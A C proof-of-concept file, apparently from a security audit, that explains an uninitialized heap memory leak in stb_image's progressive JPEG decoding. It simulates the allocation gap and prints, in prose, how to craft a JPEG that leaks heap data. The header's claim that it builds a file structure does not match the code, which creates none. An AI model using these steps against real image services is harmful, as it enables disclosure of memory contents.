// PoC: H4 -- Progressive JPEG uninitialized heap memory leak
//
// Generates a progressive JPEG that defines 3 components in SOF but
// only includes scan data for components 0 and 1. Component 2's
// coefficient buffer is allocated with malloc (not zeroed) and never
// populated, but stbi__jpeg_finish processes all 3 components.
// Heap contents leak into the output image.
//
// This PoC creates the minimal file structure to demonstrate the issue.
//
// Build: gcc -O0 -g -o poc_jpeg_progressive_leak poc_jpeg_progressive_leak.c -lm
// Run:   ./poc_jpeg_progressive_leak

#define STB_IMAGE_IMPLEMENTATION
#include "../stb/stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static void put16be(uint8_t *p, uint16_t v) {
    p[0] = (v >> 8); p[1] = v & 0xff;
}

int main(void) {
    printf("Progressive JPEG uninitialized coefficient buffer leak\n");
    printf("======================================================\n\n");

    printf("stb_image.h:3346 allocates coefficient buffers with malloc (no zeroing):\n");
    printf("  z->img_comp[i].raw_coeff = stbi__malloc_mad3(w2, h2, sizeof(short), 15);\n\n");

    printf("stb_image.h:3085 processes ALL components without checking if scanned:\n");
    printf("  for (n=0; n < z->s->img_n; ++n) {\n");
    printf("    // dequantize and IDCT every block, including uninitialized ones\n\n");

    printf("a crafted progressive JPEG can define 3 components in SOF but only\n");
    printf("include SOS scans for 2 of them. the 3rd component's coefficient\n");
    printf("buffer contains whatever was on the heap before, and the IDCT\n");
    printf("transforms it into output pixel values.\n\n");

    printf("demonstrating the allocation gap:\n\n");

    // allocate and free some recognizable data to poison the heap
    char *poison = malloc(8192);
    if (poison) {
        memset(poison, 0xAB, 8192);
        free(poison);
    }

    // now allocate like stb_image would for a coefficient buffer
    // (w2=8, h2=8 for an 8x8 block, sizeof(short)=2)
    int w2 = 8, h2 = 8;
    short *coeff = (short *)malloc(w2 * h2 * sizeof(short) + 15);
    if (!coeff) { printf("malloc failed\n"); return 1; }

    // check what's in the "uninitialized" buffer
    int nonzero = 0;
    for (int i = 0; i < w2 * h2; i++) {
        if (coeff[i] != 0) nonzero++;
    }

    printf("  allocated %d shorts (coefficient buffer for one 8x8 block)\n", w2 * h2);
    printf("  non-zero values in uninitialized buffer: %d / %d\n", nonzero, w2 * h2);

    if (nonzero > 0) {
        printf("\n  first 8 uninitialized coefficient values:\n");
        for (int i = 0; i < 8 && i < w2 * h2; i++) {
            printf("    coeff[%d] = %d (0x%04hx)\n", i, coeff[i], (unsigned short)coeff[i]);
        }
        printf("\n  these heap values would be dequantized and IDCT'd into output pixels.\n");
    } else {
        printf("\n  (heap happened to be zeroed -- run multiple times or after other allocations)\n");
    }

    free(coeff);

    printf("\nto fully exploit: craft a progressive JPEG with 3 components in SOF0,\n");
    printf("send SOS scans for only components 0 and 1, and the output image's\n");
    printf("blue channel (component 2) will contain transformed heap data.\n");

    return 0;
}
